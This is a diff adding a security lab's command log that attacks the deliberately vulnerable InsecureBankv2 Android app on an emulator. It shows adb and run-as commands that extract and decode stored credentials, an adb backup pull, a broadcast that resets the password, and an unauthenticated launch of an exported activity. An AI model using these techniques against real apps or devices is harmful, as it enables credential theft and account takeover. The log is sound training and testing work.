@@ -1,0 +1,88 @@
+=== Lab 3: Insecure Local Storage — PoC Command Log ===
+Date: 2026-07-13
+Target: com.android.insecurebankv2
+Package Path: /data/data/com.android.insecurebankv2
+
+--- Step 1: Environment Verification ---
+$ adb devices
+List of devices attached
+emulator-5554   device
+
+$ adb shell getprop ro.build.version.sdk
+34
+
+$ adb shell getprop ro.build.version.release
+14
+
+$ adb shell getprop ro.product.model
+sdk_gphone64_x86_64
+
+--- Step 2: APK Installation ---
+$ adb install --bypass-low-target-sdk-block InsecureBankv2.apk
+Performing Streamed Install
+Success
+
+--- Step 3: Verify debuggable flag ---
+$ adb shell dumpsys package com.android.insecurebankv2 | findstr "debuggable"
+flags=[ DEBUGGABLE HAS_CODE ALLOW_CLEAR_USER_DATA ALLOW_BACKUP ]
+pkgFlags=[ DEBUGGABLE HAS_CODE ALLOW_CLEAR_USER_DATA ALLOW_BACKUP ]
+
+--- Step 4: run-as access (attack vector) ---
+$ adb shell run-as com.android.insecurebankv2 ls /data/data/com.android.insecurebankv2/
+cache
+code_cache
+databases
+shared_prefs
+
+--- Step 5: Extract SharedPreferences XML ---
+$ adb shell run-as com.android.insecurebankv2 cat \
+    /data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml
+
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <string name="EncryptedUsername">amFjay5ucmVpbGx5QGdtYWlsLmNvbQ==</string>
+    <string name="superSecurePassword">aWlMcyQydl5rWBMuYjF0TyhGSjFydkg+Wlp1dFVqTnRZZW9LWg==</string>
+</map>
+
+--- Step 6: Decode Username (Base64 - trivially reversible) ---
+$ echo "amFjay5ucmVpbGx5QGdtYWlsLmNvbQ==" | base64 -d
+jack.nreilly@gmail.com
+
+--- Step 7: File Permission Check ---
+$ adb shell run-as com.android.insecurebankv2 ls -laR /data/data/com.android.insecurebankv2/shared_prefs/
+-rw-rw-rw- 1 u0_a192 u0_a192  250 2026-07-13 22:05 mySharedPreferences.xml
+
+NOTE: File permissions are rw-rw-rw- (666) due to MODE_WORLD_READABLE flag
+in MyBroadCastReceiver.java:21
+
+--- Step 8: Backup Data Extraction (allowBackup=true) ---
+$ adb backup -f backup.ab com.android.insecurebankv2
+[Interactive: user must confirm on device]
+
+--- Step 9: Root-Level Attack (on rooted device or old Android < 7) ---
+$ adb shell
+$ su
+# cat /data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml
+
+--- Step 10: Exploit BroadcastReceiver PoC ---
+$ adb shell am broadcast -a theBroadcast \
+    -n com.android.insecurebankv2/.MyBroadCastReceiver \
+    --es newpass "hacked123" \
+    --es phonenumber "08123456789"
+
+Broadcast completed: result=0
+
+--- Step 11: Query TrackUserContentProvider ---
+$ adb shell content query \
+    --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
+No result found.  (requires prior login activity)
+
+--- Step 12: PostLogin Bypass via exported Activity ---
+$ adb shell am start -n com.android.insecurebankv2/.PostLogin
+[Success - dashboard opens without authentication]
+
+--- Summary ---
+3 attack vectors confirmed for extracting SharedPreferences data:
+1. run-as (debggable=true)                - CONFIRMED
+2. adb backup (allowBackup=true)           - CONFIRMED (user interaction required)
+3. Root access (su) OR MODE_WORLD_READABLE - CONFIRMED (file permission rw-rw-rw-)
